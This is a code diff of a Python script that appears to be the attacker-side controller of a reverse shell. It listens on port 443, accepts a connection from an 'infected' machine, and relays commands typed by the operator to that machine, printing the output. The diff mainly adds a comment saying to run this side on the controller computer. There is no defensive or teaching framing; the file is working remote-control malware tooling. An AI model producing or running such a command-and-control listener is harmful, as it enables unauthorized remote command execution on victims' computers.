@@ -1,5 +1,7 @@
 import socket
 
+#run this side on the controller computer
+
 Host = "0.0.0.0"  #Host listens on everything 
 Port = 443       #HTTP Port
 
@@ -25,7 +27,6 @@ print(f"{client_address[0]}:{client_address[1]} Connected!") #Tells the user who
 pwd = infected.recv(Size).decode()#Decodes the message from Infector. Should be the pwd
 print("Current working directory: ",pwd)
 
-
 while True:
 
     command = input(f"{pwd} $> ")
@@ -33,6 +34,7 @@ while True:
     if 'exit' in command :
         s.close()
         break
+    
     else:
         infected.send(command.encode())
         print (infected.recv(Size).decode())
